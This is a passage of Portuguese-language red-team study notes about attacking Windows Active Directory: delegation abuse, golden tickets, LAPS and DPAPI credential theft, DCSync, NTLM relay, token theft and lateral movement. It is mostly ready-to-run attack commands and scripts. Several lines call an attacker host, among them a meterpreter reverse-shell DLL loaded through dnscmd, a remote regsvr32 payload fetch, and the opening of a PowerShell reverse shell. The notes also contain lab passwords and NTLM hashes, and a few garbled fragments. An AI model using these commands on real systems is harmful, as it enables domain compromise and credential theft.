				hashcat -m 18200 asrep.txt wordlist.txt
				hashcat -m 13100 krb.txt wordlist.txt


## Contrained Delegation
	# Contas com msds-allowedToDelegateTo podem ser identificados por 
		pywerview get-netcomputer -u <USER> -p <PASSWORD> --dc-ip <IP> --full-data
		Get-DomainComputer – TrustedToAuth
		Get-DomainUser –TrustedToAuth


	# Conta Usuário 
		# 1 - Encontrar o usuário com a atributo TRUSTED_TO_AUTH_FOR_DELEGATION habilitada - [Conta habilitada para delegação]
		Get-NetUser -TrustedToAuth # o atributo msds-allowedtodelegate indica em quais SPNs o usuário pode delegar
		# 2 - Usar o Rubeos para criar um TGT de delegação - nele virá o ticket.kirbi  em base64 para se usado posteriormente 
		.\Rubeus.exe tgtdeleg
		# 3 - Usar o Rubeos para criar um ticket personificando outro usuário ou máquina 
			# ticket is the base64 ticket we get with `rubeus's tgtdeleg`
		Rubeus.exe s4u /ticket:<O gigantesco base64 oriundo do comando tgtdeleg> /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
		# 4 - Verificar
		klist 
		dir \\dc01.offense.local\c$ 
	
	# Conta Computador - contas system do Windows 
		# 1 - Encontrar computadores habilitados para delegação 
		Get-NetComputer ws02 | select name, msds-allowedtodelegateto, useraccountcontrol | fl
		Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | fl

		# 2 - Verificar o usuário atual como system e que nao pode acessar o C$ do DC 
		hostname
		[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
		ls \\dc01.offense.local\c$

		# 3 - Personificar o Administrator 
		[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
		$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
		$idToImpersonate.Impersonate()
		[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name

		ls \\dc01.offense.local\c$

## Resource Based Constrained Delegation 
	# Pode ser explorado controlando uma conta com S4U2Self habilitado e que tenha o privilégio de editar a propriedade msDS-AllowedToActOnBehelfOfOtherIdentity
	## Kerberos Resource-Based Constrained Delegation Computer Object Take Over - Cenário da Elearn 
		• Code execution is achieved on W10-DESKTOP01 box as ELS\Attacker.
		• ELS\Attacker has write privilege over the target computer W10-DESKTOP02
		• Default policies for adding new computers are present. Meaning no admin is required to add a new computer object NONEXISTENT
		• ELS\Attacker uses the WRITE privilege on W10-DESKTOP02 computer object and updates msDS- AllowedToActOnBehalfOfOTherIdentity to allow the NONEXISTENT computer resource to impersonate any domain user on W10-DESKTOP02
		• Due to the msDS-AllowedToActOnBehalfOfOTherIdentity attribute, W10-DESKTOP02 trusts NONEXISTENT. This means Kerberos tickets for the NONEXISTENT$ Account can be requested with the ability to impersonate other users.
		# 1 - Checar o ms-ds- machineaccountquota 
			Get-DomainObject –Identity 'cn=ELS,cn=LOCAL' –Domain ELS.LOCAL
		# 2 - Verificar se o Domain Controller está pelo menos no Windows Server 2012
			Get-DomainController
		# 3 -  Criar uma Computer Account nova com o PowerMad - https://github.com/Kevin-Robertson/Powermad
			import-module .\PowerMad.psd1
			New-MachineAccount -MachineAccount <FAKE_ACCOUNT> -Password $(ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force) – Verbose
		# 4 - Obter o SID da nova conta computador criada 
			Get-DomainComputer NONEXISTENT
		# 5 - Criar uma nova descrição raw security para a nova conta usando o objectsid 
			$SD = New-Object Security.AccessControl.RawSecurity Descriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOC RSDRCWDWO;;;<OBJECTSID>)"
			$SDBytes = New-Object byte[] ($SD.BinaryLength)
			$SD.GetBinaryForm($SDBytes, 0)
		# 6 - Modificar o msds-allowedtoactonbehalfofotheridentity do Alvo para o valor do Computador criado atravé da variável SDBytes 
			Get-DomainComputer <TARGET> | Set-DomainObject -Set @{'msds- allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
		# 7 - Verificar que o alvo agora tem o atributo modificado 
			Get-DomainComputer <TARGET>
		# 8 - Gerar o hash rc4 do Computador criado 
			Rubeus.exe hash /password:<PASSWORD> /user:<COMPUTER_NAME> /domain:<DOMAIN_NAME>
		# 9 - Finalmente, fazer a conta criada personificar o Administrador no alvo 
			.\Rubeus.exe s4u /user:<COMPUTER_ACCOUNT> /domain:<DOMAIN> /rc4:<RC4_HASH> /impersonateuser:<TARGET_USER> /msdsspn:http/<TARGET_COMPUTER> /altservice:cifs,host /ptt
		####### Trecho de código do material #########		 
			# the target computer object we're taking over
			$TargetComputer = "<TARGET_COMPUTER>"
			# find targets with S4U2Self enabled
			Get-DomainObject -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=16777216)' -Properties samaccountname,useraccountcontrol | fl
			# get our attacker's SID (account with rights over the target)
			$AttackerSID = Get-DomainUser <ATTACKER> -Properties objectsid | Select -Expand objectsid
			# verify the GenericWrite permissions on $TargetComputer
			$ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}
			$ACE
			ConvertFrom-SID $ACE.SecurityIdentifier
			# the identity we control that we want to grant S4U access to the target
			$S4UIdentity = "<DOMAIN>\<CONSTRAINED_USER>"
			# translate the identity to a security identifier
			$IdentitySID = ((New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $S4UIdentity).Translate([System.Security.Principal.SecurityIdentifier])).Value
			# substitute the security identifier into the raw SDDL
			$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($IdentitySID))"
			# get the binary bytes for the SDDL
			$SDBytes = New-Object byte[] ($SD.BinaryLength)
			$SD.GetBinaryForm($SDBytes, 0)
			# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
			Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds- allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
			# check that the ACE added correctly
			$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds- allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
			$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0 $Descriptor.DiscretionaryAcl
			ConvertFrom-SID $Descriptor.DiscretionaryAcl.SecurityIdentifier
			# execute Rubeus' s4u process against $TargetComputer
			Rubeus.exe s4u /user:<CONSTRAINED_USER> /rc4:<NTLM_HASH> /impersonateuser:<TARGET_USER> /msdsspn:cifs/<TARGET_COMPUTER> /ptt
			dir \\<TARGET_COMPUTER>\C$
			# clear the 'msds-allowedtoactonbehalfofotheridentity' security descriptor out
			Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds- allowedtoactonbehalfofotheridentity' -Verbose
		######################################

		## Kerberos RBCD via Image Change 

## Ataques Kerberos via Proxy 
	# 1 - Desabilitar o proxy_dns no proxychains.conf
	nano /etc/proxychains.conf
	# 2 - Alterar o arquivo hosts para incluir as entradas de FQDN do Domain Controller e dos nomes NetBios dos computadores alvos 
	nano /etc/hosts
	# 3 - Sincronizar o Tempo com o Domain Controller - Diferença maior que 5 min causa erro no kerboros
	proxychains -q net time -S CHILD.DC01 
	# 4 - exportar um ticket 
	export KRB5CCNAME=/opt/kerburte/operador.ccache
	# Proceder com ataques de forca bruta com Kerbrute
	proxychains ./kerbrute.py –users <USERLIST> -passwords <PASSWORDLIST> -domain DOMAIN_NAME –threads N
	# Evil WinRM pode ser usado com tickets kerberos obtidos previamente
	proxychains evil-winrm.rb -i <HOST> -r <DOMAIN>
	# nesse caso foi obtida uma conta krbtgt, que será usada para se gerar tickets - serão salvos em .ccache
	ticketer.py –nthash KRBTGT_HASH –domain-sid DOMAIN-SID –domain DOMAIN-NAME USER
	ticketer.py -nthash dnioqw3n12i12oi2e0129eu129e091u -domain-sid S-1-5-21-12123123123-23123123123-23123123213 -domain els-child.els.local Administrator 
	# podem ser convertidos em kirbi 
	ticket_converter.py Administrator.kirbi Administrator.ccache
	# todos os scripts do Impacket podem ser usados com a opcao -k e --no-pass para se usar os tickets 
	proxychains –q psexec.py DOMAIN/USER@SERVER-NAME –k –no-pass
	## LDAP
	proxychains crackmapexec smb -u 'dev-admin' -p 'H@rdP@ssD!ff!cult964!!' -d ELS-CHILD 10.10.2.0/24 
	proxychains ldapdomaindump -u 'ELS-CHILD\dev-admin' -p 'H@rdP@ssD!ff!cult964!!' --authtype SIMPLE ldap://10.10.2.2:389 #Aqui deve ser o Controlador de domínio - Em caso de forest, cada dump dever ser feito com o respectivo DC 
	proxychains ldapdomaindump -u 'ELS.CORP\els-admin' -p 'aad3b435b51404eeaad3b435b51404ee:8645e87e2593507cf623f3291b1334c2' --authtype NTLM ldap://10.10.3.2:389 
	python3 /mnt/hgfs/HD_KALI/TOOLs/PTX_ARSENAL/ldapdomaindump/ldapdomaindump.py -u 'XOR.COM\XOR-APP59$' --authtype NTLM -p 'aad3b435b51404eeaad3b435b51404ee:7c13687d23a3a88e57fc9ef8bb4cdf2f' ldap://10.11.1.120:389
 -at NTLM -p 
3fee04b01f59a1001a366a7681e95699 
## Abusing Forest Trusts 
	## Golden Tickets e SID Filtering 
		kerberos::golden /domain:forest-a.local /sid:<DOMAIN_SID> /rc4:<KRBTGT_HASH> /user:<USER> /target:forest-a.local /service:krbtgt /sids:<NON_MEMBER_GROUP_SID>,<UNEXISTENT_DOMAIN_ SID>,S-1-18-1,<FOREST_B_GROUP> /ptt
	
	## Permitir SID History em cross-forest trust
		netcom trust /d:forest-a.local forest-b.local /enablesidhistory:yes

## LAPS - Local Administrator Password Solution 
	## Recon Dll presente em C:\Program Files\LAPS\CSE\Admpwd.dll e configurada na chave de registro HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtenstions
		Get-Acl -Path "C:\Program Files\LAPS\CSE\AdmPwd.dll" | fl 
		Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
		Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'
		Test-Path 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions'

	## Computadores gerenciados pelo LAPS tem dois novos atributos e uma nova GPO
		 Get-AdObject 'CN=ms-mcs- admpwd,CN=Schema,CN=Configuration,DC=ELS,DC=LOCAL'
		 Get-DomainGPO -Identity '*LAPS*'

	## Configuração em Registry.pol em gpcfilesyspath 
		Parse-PolFile '\\ELS.LOCAL\SysVol\ELS.LOCAL\Policies\<{G UID_NAME}>\Machine\Registry.pol'

	## PowerView - Encontrar todos os computadores que possuem LAPS GPO 	
		PS C:\> Get-DomainOU -GPLink "<GUID_NAME>" –Properties distinguishedname
		PS C:\> Get-DomainComputer –SearchBase "LDAP://<distinguishedname>" - Properties distinguishedname
	## PowerView - Identificar LAPS View Access (Delegation) - Contas que podem ler o ms-Mcs-AdmPwd assim poden ver senha em claro
		Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActivedirectoryRights -match 'ReadProperty') } | For-EachObject { $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSId $_.IdentityReference).SID; $_}
		 
		PS C:\> $LAPSAdmins = Get-ADGroup ‘<GROUP1>’ | Get-ADGroupMember - Recursive
		PS C:\> $LAPSAdmins += Get-ADGroup ‘<GROUP1>’ | Get-ADGroupMember -Recursive
		PS C:\> $LAPSAdmins | Select Name,distinguishedName | sort name – unique | format-table -auto

	## Identificar grupos que tenham "All Exetended Rights" a uma OU que contenha computadores com LAPS (Podem ler senhas em claro)
		Find-AdmPwdExtendedRights -Identity workstations | % {$_.ExtendedRightHolders}

## Laps Exploração 
	# Com os direitos certos - Obter lista de computadores e suas senhas
		Get-ADComputer -filter {ms-Mcs-AdmPwdExpirationTime -like '*'}
	# Se a máquina possuir os cmdlets do LapsPowerShell 
		Get-AdmPwdPassword –ComputerName <Target> | fl
	# Encontrar máquinas com LAPS através do atributo ms-mcs-adminPwdExpiration
		Get-ADComputer –filter {ms-Mcs-AdmPwdExpirationTime like '*'}” –Properties -ms-Mcs-AdmPwdExpirationTime
	# Caso se comprometa um computador com LAPS, pode-se aumentar o tempo de expirar a senha para persistencia com 
		Set-DomainObject -Identity <TARGET_COMPUTER> -Set @{'ms- Mcs-AdmPwdExpirationTime'='<NEW_VALUE>'} –Verbose

	## LapsToolKit ## https://github.com/leoloobeek/LAPSToolkit ## 
		Get-LapsComputers 
		Find-LapsDelegatedGroups 
		Find-AmdPwdExtendedRights
	## Modificar o AdmPwd.dll, ou AdmPwd.PS.dll ou PSType.cs para persistencia ## 

## Acl e AD Objects 
	# AcLight para descobrir contas com privilégios # https://github.com/cyberark/ACLight
		import-module ACLight2.psm1
		Start-ACLAnalysis
## Backup Operators 
	# Tem os atributos SeBackupPrivilege e SeRestorePrivilege
	#Podem criar arquivos em qualquer lugar no sistema e chaves de registro se não existirem 

## ExChange
	#Adcionar um usuário do Organization Management para o Exchange Windows Permissions
		$id = [Security.Principal.WindowsIdentity]::GetCurrent() $user = Get-ADUser -Identity $id.User Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members $user
	
	# Logout e Login novamente 	 
		$acl = get-acl "ad:DC=els,DC=local"
		$id = [Security.Principal.WindowsIdentity]::GetCurrent()
		$user = Get-ADUser -Identity $id.User
		$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
		# rightsGuid for the extended right Ds-Replication-Get-Changes-All
		$objectguid = new-object Guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
		$identity = [System.Security.Principal.IdentityReference] $sid
		$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
		$type = [System.Security.AccessControl.AccessControlType] "Allow"
		$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
		$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType $acl.AddAccessRule($ace)
		# rightsGuid for the extended right Ds-Replication-Get-Changes
		$objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
		$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType $acl.AddAccessRule($ace)
		Set-acl -aclobject $acl "ad:DC=els,DC=local"

	# Se o usuário tiver o RBAC role pode-se efetuar via DCSync		 
		PS C:\> $id = [Security.Principal.WindowsIdentity]::GetCurrent()
		PS C:\> Add-ADPermission "DC=test,DC=local" -User $id.Name - ExtendedRights Ds-Replication-Get-Changes,Ds-Replication-Get- Changes-All

## Invoke-AclPwn # https://github.com/fox-it/Invoke-ACLPwn # Tenta automatizar a exploração de ACL mal configurada 
	.\Invoke-ACLPwn.ps1 -mimiKatzLocation ..\mimikatz\mimikatz.exe -SharpHoundLocation ..\SharpHound2.exe 

##NTLMRelayx 
	ntlmrelayx.py -t ldap://<DOMAIN_CON TROLLER> --escalate-user <USER>
	secretsdump.py --just-dc-user <TARGET_USER> <DOMAIN>/<ESCALATED_USER>@<DOMAIN_CONTROLLER>
	# Exemplo
	ntlmrelayx.py -t ldap://ELS-DC01.ELS.LOCAL --escalate-user operator
	secretsdump.py --just-dc-user Administrator ELS.LOCAL/operator@els-dc01

## Privileged Access Management - PAM 
	# Verificar se PAM está habilitado 
		Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
		#Ou via Shadow Securty Principals 
		Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSID
	# Verificar se a Forest atual é gerenciada por outra 
		Get-ADTrust -Filter {(ForestTransitive -eq $True)}
	
	# Para Explorar PAM deve-se comprometer usuarios ou grupos do Shadow Security OPrincipals 
		Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | fl
	
## Just Enough Administration - JEA 
	# Criar um template de configuração para JEA
		New-PSSessionConfigurationFile -SessionType RestrictedRemoteServer -Path .\<FILE>.pssc
	# Automatizar persistencia com JEA pode ser feita com o toolkit RACE 
		Set-JEAPermissions -ComputerName <TARGET> - SamAccountName <USER> -Verbose
		# Se conectar nele via 
		Enter-PSSession –ComputerName <TARGET> - ConfigurationName microsoft.powershell64

## DNSAdmin
	# Acessar a interface do DNS MAnager 
		dnsmgmt.msc
	# Membros do grupo DNSAdmins podem fazer o servidor carregar uma DLL sem realizar os devidos cheques 
		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.10 LPORT=4444 --smallest -f dll --encrypt rc4 --encrypt-key "W00TW00T" -o dnsadmin.dll
	# Usar smbserver do Impacket para hospedar os arquivos de DLL 
		smbserver.py -smb2support -debug DnsAdmins /root/dlls 
	# Do servidor comprometido usar o dnscmd.exe 
		PS > Dnscmd.exe <DC> /config /serverlevelplugindll \\<ATTACKER_IP>\<SHARE_NAME>\dnsadmin.dll 
		PS > sc.exe \\<DC_IP> start dns
		# Clean up via
		PS > sc.exe \\<DC_IP> stop dns
		PS > reg.exe \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
		PS > sc.exe \\<DC_IP> stop dns
	# Adcionar ao metasploit o DnsAdmin_serverPluginDll.rb para escalar privilégios com a Dll - https://github.com/ide0x90/metasploit-framework/blob/dnsadmin-privesc/modules/exploits/windows/local/dnsadmin_serverlevelplugindll.rb
		/modules/exploits/windows/local/dnsadmin_serverplugindll.rb

## DPApi 
	# Se a senha do usuário for usada para derivar a master key, que estará localizada em 
		%APPDATA%\Microsoft\Protect\<SID>\<GUID>\
	# Para se decriptar dados encriptados pelo DPAPI se precisa obter a master key do usuário 
		## Chrome - default locations 
			• Login Data: “%localappdata%\Google\Chrome\User Data\Default\Login Data”
			• Cookies: “%localappdata%\Google\Chrome\User Data\Default\Cookies” for the SQLite database file containing cookie values.
			# Mimikatz - atravé de execução de código através do perfil do usuário 
				dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
			# Mimikatz - Pegar a Master KEy através de acesso administrativo com o usuário logado
				sekurlsa::dpapi
				sekurlsa::msv 
				dpapi::chrome /in:”<CHROME_PATH>” /masterkey:<MASTER_KEY>
			# Mimikatz - Acesso administrativo com usuário deslogado (Senha do usuário ou hash NTLM - obrigatório)
				dpapi::masterkey /in:<MASTERKEY_LOCATION> /sid:<USER_SID> /password:<PASSWORD> /protected
				# Hash - Usar mimikatz com hash para spawnar um novo processo no contexto do usuário 
					sekurlsa::pth /user:Attaker /Domain:els.local /ntlm:<HashNTLM> 
					#Então...
					dpapi::masterkey /in:”<MASTER_KEY> /rpc” and then the contents can be decrypted via “dpapi::chrome /in:”<CHROME_PATH>”
			# Acesso através de Privilégios elevados no domínio
				# 1 - Obter a BackupKey
				lsadump::backupkeys /system:<DOMAIN_CONTROLLER> /export 
				# 2 - Decriptar a Master Key do usuário com a BackupKey 
				dpapi::masterkey /in:"c:\Users\User\Appdata\Roaming\Microsoft\Protect\...\<USER_MASTERKEY>" /pkv:<Domain_Backup_key>
				# 3 - Decriptar os arquivos, como os cookies por exemplo:
				dpapi::chrome /masterkey:"c:\Users\User\Appdata\Roaming\Microsoft\Protect\...\<USER_MASTERKEY>" /in:"Caminho para os cookies do chrome"
				
		## Credential Manager e Windows Vaults 
			# Arquivos de credenciais sao salvos em:
				C:\Users\Usuario\AppData\Local\Microsoft\Credentials #usuário 
				#ou 
				%systemroot%\System32\config\systemProfile\AppData\Local\Microsoft\Credentials\ #sistema 
			# Password Vault salvos em:
				C:\Users\Usuarios\AppData\Local\Microsoft\Vault\<VAULT_GUID>\ 
				# Mimikatz - Tentativa de decriptar as credenciais do vault
				vault::list 
				vault::cred
				vault::cred /patch 
				# Mimikatz - se a senha do usuario for conhecida pode-se decriptar a masterkey 
				dpapi::masterkey /in:"Caminho para o user key" /sid:<USER_SID> /password:<SENHA> /protected 
				# Mimikatz sem saber a senha do usuario 
				dpapi::masterkey /in:”%appdata%\Microsoft\Protect\<SID>\<MASTER_KEY_GUID>” /rpc
				# Extrair senhas em claro 
				dpapi::creds /in:”<CREDENTIALS>” /masterkey:<MASTERKEY> /unprotect

## Token 
	# Access token são usados para determinar a quem pertence determinado processo ou thread no Windows 
	# Criado um arquivo C# e fornecido pela escola chamado TokenImpersonation.cs que deve ser compilado e carregado refletivamente via powershell
		# Kali
		csc -target:library TokenImpersonation2.cs -out:TokenImpersonation.dll && echo "[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('$(base64 --input=./TokenImpersonation.dll --break=0)'))"
		# Windows 
		[TokenAbuse]::IsPrivilegeEnable("SeDebugPrivilege")
		[TokenAbuse]::Whoami()
		whoami /priv
		whoami /all 
		[TokenAbuse]::EnablePrivilege(<Nome_Privilegiado>) # Checa se o privilégio estava habilitado antes e se nao estiver habilita 
		[TokenAbuse]::ImpersonateProcessToken((Get-Process WinLogon)[0].Id)
		[TokenAbuse]::ImpersonateProcessToken(10596)
		[TokenAbuse]::Rev2Self()

	# Runas - Run as Alguem 
		runas.exe /user:Dominio.Local\Usuario 'cmd.exe'
	
	# Meterpreter - Incognito - steal_token ou impersonate_token
	> getuid
	> steal_token 11004 # Personificação através de "roubo" do token
	> getuid
	> list_tokens # mostra token diponíveis para delegação 
	> impersonate_token ELS\\Administrador

	# Tokenvator Framework - https://github.com/0xbadjuju/Tokenvator
		meterpreter > execute -c -i -f Tokenvator.exe
		(Tokens) > whoami
		(Tokens) > Steal_Pipe_Token \\.\pipe\ELS 

		(Tokens) > GetSystem 
		(Tokens) > list_privileges splunkd
		(Tokens) > disable_privileges 
########################################### ########## ###########################################

########################################### MovLateral ###########################################

##PsExec 		
	#Psexec.exe
	psexec.exe -u DOMAIN\USER -p PASSWORD \\REMOTE ”COMMAND” 
	#Psexec.py
	python psexec.py DOMAIN/USER:PASSWORD@REMOTE [CMD]

## SC - Service Control - gerencia servicos localmente ou remotamente via smb 
	sc.exe \\REMOTE create SERVICE_NAME displayname=NAME binpath=“COMMAND” start=demand
	sc.exe \\REMOTE start SERVICE_NAME sc.exe \\REMOTE delete SERVICE_NAME

	# Dll Hijack - mudar inserir a dll e restartar o serviço como no IKEEXT ou SessionEnv service
		sc.exe \\COMPUTER stop SessionEnv
		copy TSMSISrv.dll to C:\Windows\System32\TSMSISrv.dll 
		sc.exe \\COMPUTER start SessionEnv

## SchTasks - Agendar tarefas 	 
	# Schtasks.exe Example
	schtasks /create /F /tn TASKNAME /tr COMMAND /sc once /st 23:00 /s REMOTE /U USER /P PASSWORD
	schtasks /run /F /tn TASKNAME /s REMOTE /U USER /P PASSWORD schtasks /delete /F /tn TASKNAME /s REMOTE

## AT - agendar tarefas a rodar num horário específico 
	# Modify registry to re-enable at
		Reg add "\\REMOTE\\HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Schedule\Configuration /v EnableAt /t REG_DWORD /d 1"
		# Force restart NOT OPSEC Friendly 
		Shutdown /r /m \\REMOTE
		# Get computer time, execute and cleanup 
		net time \\REMOTE
		at \\REMOTE TIME COMMAND
		at \\REMOTE AT_ID /delete

## WMI - Windows Management Instrumentation	 
	# WMIC Example
	wmic /node:REMOTE /user:DOMAIN\USER /password:PASSWORD process call create “C:\Windows\System32\notepad.exe”
	# WMIC Passing the Ticket
	wmic /authority:”Kerberos:DOMAIN\REMOTE” /node:REMOTE process call create “C:\Windows\System32\nodepad.exe”

## Poison Handler - https://github.com/Mr-Un1k0d3r/PoisonHandler 
	# Execute with the current user
	Execute-PoisonHandler -ComputerName <TARGET> -Payload "<PAYLOAD>"
	# Execute with a custom handler name
	Execute-PoisonHandler -ComputerName <TARGET> -Payload "<PAYLOAD>" -Handler ms-handler-name
	# Execute as other user
	Execute-PoisonHandler -ComputerName <TARGET> -Payload "<PAYLOAD>" -Username <USER> -Password <PASSWORD>
	# Use rundll32 url.dll,FileProtocolHandler
	Execute-PoisonHandler -ComputerName <TARGET> -Payload "<PAYLOAD>" -Username <USER> -Password <PASSWORD> -UseRunDLL32 True # Specify the remote command used. the handler name will be appended at the end automatically.
	Execute-PoisonHandler -ComputerName <TARGET> -Payload "<PAYLOAD>" -Username <USER> -Password <PASSWORD> -RemoteCommand "<PAYLOAD>"

## Remote Dekstop Services - RDP 
	#PTH com remote Desktop de um linux 
	xfreerdp /u:<USER> /d:<DOMAIN> /pth:<NTLM-HASH> /v:<IP-ADDRESS>
	# PTH para RDP no Windows com mimikatz
	sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM-HASH> /run:"mstsc.exe /restrictedadmin"
	#Habilitar o Restricted Admin Mode
	PS > Enter-PSSession -Computer <TARGET>
	PS > New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force

	# SharpRDP -  Remote Desktop Protocol Console Application for Authenticated Command Execution
		# Regular Execution
		SharpRDP.exe computername=<TARGET.DOMAIN> command=“<FILE_TO_EXECUTE>” username=<DOMAIN\USER> password=<PASSWORD>
		# Exec as child process of cmd.exe
		SharpRDP.exe computername=<TARGET.DOMAIN> command=“<FILE_TO_EXECUTE>” username=<DOMAIN\USER> password=<PASSWORD> exec=cmd
		# Restricted Admin
		SharpRDP.exe computername=<TARGET.DOMAIN> command=“<FILE_TO_EXECUTE>”
		# Execute Elevated via taskmgr
		SharpRDP.exe computername=<TARGET.DOMAIN> command=“<FILE_TO_EXECUTE>” username=<DOMAIN\USER> password=<PASSWORD> elevated=taskmgr
		# Add NLA
		SharpRDP.exe computername=<TARGET.DOMAIN> command=“<FILE_TO_EXECUTE>” username=<DOMAIN\USER> password=<PASSWORD> nla=true

		# Sequestrar Sessoes Rdp de outros Usuario
			# Encontrar sessoes e obter o ID e SESSIONNAME
				PS > query user
			# Criar um servico para tomar a sessao 
				sc.exe create rdphijack binpath=“cmd.exe /c tscon <SID> /dest:<SNAME>”
			# Iniciar o servico e acessa-lo				 
				PS > net start rdphijack
				PS > sc.exe delete rdphijack

		# Acessar Credenciais RDP com RemoteViewing e Donut
			https://github.com/FuzzySecurity/Sharp-Suite
			https://github.com/TheWover/donut


			#Compilar o binário e entao converter com donut para shellcode
				PS > .\donut.exe –f 7 <PATH_TO_BIN> -o <OUTPUT_FILE>
			# RemoteViewing.cs fornecido pela escola 
				csc RemoteViewing.cs -out:RemoteViewing.exe

## SCShell - utiliza o ChangeServicesConfigA para rodar comandos via DCERPC ao inves do SMB 
	#ChangeServiceConfigA - Muda os parametros de configuracao de um servico 
	# DCERPC - Distributed Computing Enviroment / Remote Procedure Calls  
	PS > SCShell.exe <TARGET> XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://<PAYLOAD-WEBSITE>/payload.sct scrobj.dll" . <USER> <PASSWORD>
	
	# Obtendo o mesmo resultado com 4 comandos de Wmic  
		# Get currant path name of the service to restore it later
		wmic /user:<DOMAIN\USER> /password:<PASSWORD> /node:<TARGET> service where name='XblAuthManager' get pathname
		# Change the path name to the command to be executed
		wmic /user:<DOMAIN\USER> /password:<PASSWORD> /node:<TARGET> service where name='XblAuthManager' call change PathName="C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe C:\testPayload.xml"
		# Start the service
		wmic /user:<DOMAIN\USER> /password:<PASSWORD> /node:<TARGET> service where name='XblAuthManager' call start service
		# Restore the Service Path Name
		wmic /user:<DOMAIN\USER> /password:<PASSWORD> /node:<TARGET> service where name='XblAuthManager' call change PathName="C:\Windows\system32\svchost.exe -k netsvcs"


## Winrm - Implementação do WS-Management Protocol rodando na 5985 e 5986 
	#Habilitar
	Enable-PSRemoting –Force
	 
	# winrs Example 
	winrs -r:EEMOTE -u:DOMAIN\USER -p:PASSWORD notepad.exe
	# Powershell Example avoiding double-hop problem with -EnableNetworkAccess
	PS> Enter-PSSession –ComputerName REMOTE –Credential DOMAIN\USER –EnableNetworkAccess # WinRM.vbs Available by default
	# WSMan-Winrm - https://github.com/bohops/WSMan-WinRM
	cscript \\nologo "C:\windows\system32\winrm.vbs" invoke create wmicimv2\win32_process @{CommandLine="notepad.exe"} -r:IPADDRESS

	# WinRm - https://github.com/Hackplayers/evil-winrm
		ruby evil-winrm.rb -i 10.10.101.192 -u "usuário" -H "<HASH DO USER>"
		ruby evil-winrm.rb -i 10.10.101.192 -u <usuário> -p <Senha>

	# CrackMapExec 
		cme winrm -u <user> -p <senha> -d <Dominio> 10.10.10.10 -x 'whoami /all'

	# Metasploit 
		scanner/winrm/winrm_login
	
## DCOM - Distributed COM - Comunicação interprocessos na rede 
	# Powershell Examples
		$COM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.APPLICATIO N", ”REMOTE"));$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\Sys tem32\cmd.exe", $Null, “/c”, ”notepad.exe")

	# Impacket
		dcomexec.py 

## Named Pipes 
	#Invoke Pbind cria um bind shell usando named pipes  
	PS C:\> Invoke-Pbind –Target 192.168.100.23 –Domain ELS –User eLSAdmin –Password hard2crack!

## Powershell Web Access - PSWA 
	Pesquisar mais

## Net-NTLM Relaying 
	# Lembrar do Signing disable 
		# CME Checando o signing disable 
		cme smb 10.10.10.0/24 --gen-relay-list output_ips_sign_disable.txt 
		#Runfinger 
		python RunFinger.py -i <target IP>

	# Cenário da aula:
		# 1 - Criou um reverse shell conforme abaixo:
			$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>); $stream = $client.GetStream();
			[byte[]]$bytes = 0..65535|%{0};
